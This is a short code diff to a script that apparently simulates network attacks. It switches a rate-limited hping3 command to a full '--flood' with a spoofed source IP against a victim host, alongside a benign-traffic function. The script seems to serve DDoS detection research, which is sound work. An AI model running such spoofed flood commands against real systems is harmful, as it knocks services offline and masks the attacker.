@@ -25,11 +25,11 @@ time_delay = float(1/BANDWIDTH_RATE)
 def ddos_flood(host):
     # Attack the last host with IP 10.0.0.4
     # timout command is used to abort the hping3 command after the attack was performed for the specifed time
-    host.cmd('timeout ' + str(episode_length) + 's hping3 -i '+str('u' + str(time_delay)) + ' -a '+ spoofed_ip +' '+ victim_host_ip)
+    host.cmd('timeout ' + str(episode_length) + 's hping3 --flood ' + ' -a '+ spoofed_ip +' '+ victim_host_ip)
     host.cmd('killall hping3')
 
 def ddos_benign(host):
-    host.cmd('timeout ' + str(episode_length) + 's hping3 -i '+str('u' + str(1000))+ ' ' +victim_host_ip)
+    host.cmd('timeout ' + str(episode_length) + 's hping3 ' + victim_host_ip)
     host.cmd('killall hping3')
 
 for i in range(episode_count):
